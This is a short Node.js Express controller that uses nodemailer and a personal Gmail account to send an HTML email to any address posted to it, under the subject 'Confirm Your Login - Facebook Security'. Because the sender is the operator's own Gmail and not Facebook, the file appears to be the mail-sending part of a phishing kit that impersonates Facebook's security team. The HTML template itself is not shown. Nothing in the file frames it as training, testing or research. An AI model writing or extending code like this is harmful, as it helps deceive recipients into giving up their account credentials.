// controllers/emailController.js
require("dotenv").config();
const nodemailer = require("nodemailer");
const emailTemplate = require("../services/emailTemplate");

// Gmail SMTP transporter
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.FROM_EMAIL,             // your Gmail
        pass: process.env.GMAIL_PASS      // app password
    }
});

exports.sendLoginEmail = async (req, res) => {
    try {
        const { email } = req.body;
        if (!email) return res.status(400).json({ success: false, message: "Email required" });

        const html = emailTemplate(email);

        const mailOptions = {
            from: process.env.FROM_EMAIL,
            to: email,
            subject: "🔐 Confirm Your Login - Facebook Security",
            html
        };

        const info = await transporter.sendMail(mailOptions);
        console.log("Email sent:", info.messageId);

        return res.status(200).json({ success: true, message: "Email sent successfully" });

    } catch (err) {
        console.error("Email sending error:", err);
        return res.status(500).json({ success: false, message: "Email failed to send" });
    }
};